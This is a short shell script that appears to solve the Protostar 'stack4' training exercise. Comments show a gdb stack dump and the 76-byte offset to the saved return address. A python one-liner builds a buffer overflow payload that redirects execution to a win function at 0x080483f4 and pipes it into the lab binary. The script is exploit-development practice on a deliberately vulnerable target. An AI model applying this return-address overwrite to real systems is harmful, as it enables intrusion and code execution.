# stack4_attack.sh

# win function - 0x080483f4 

#Breakpoint 2, main (argc=1, argv=0xbffff804) at stack4/stack4.c:16
#16      in stack4/stack4.c
#(gdb) x/50x $esp
#0xbffff700:     0xbffff710      0xb7ec6165      0xbffff718      0xb7eada75
#0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
#0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
#0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
#0xbffff740:     0x41414141      0x41414141      0x41414141      0x41414141
#0xbffff750:     0x41414141      0x00000000      0xbffff7d8      0xb7eadc76 

# 0xb7eadc76 - RET instuction

# Need 76 bytes until RET 
# then change RET to win function

python -c 'print "A" * 76 + "\xf4\x83\x04\x08"' > stack4_attack.txt

/opt/protostar/bin/stack4 < stack4_attack.txt

